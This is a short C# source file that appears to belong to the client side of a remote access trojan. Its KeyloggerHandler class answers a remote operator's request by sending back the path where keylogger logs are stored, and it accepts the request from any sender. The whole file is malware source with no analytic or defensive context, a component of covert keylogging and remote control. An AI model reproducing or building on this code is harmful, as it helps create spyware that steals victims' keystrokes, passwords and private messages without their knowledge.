using Q3C273.Shared.Messages;
using Q3C273.Shared.Messages.Keylogger;
using Q3C273.Shared.Networking;
using Ton618.Config;

namespace Ton618.MessageHandlers
{
    public class KeyloggerHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectory;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectory msg:
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, GetKeyloggerLogsDirectory message)
        {
            client.Send(new GetKeyloggerLogsDirectoryResponse { LogsDirectory = Settings.LOGSPATH });
        }
    }
}
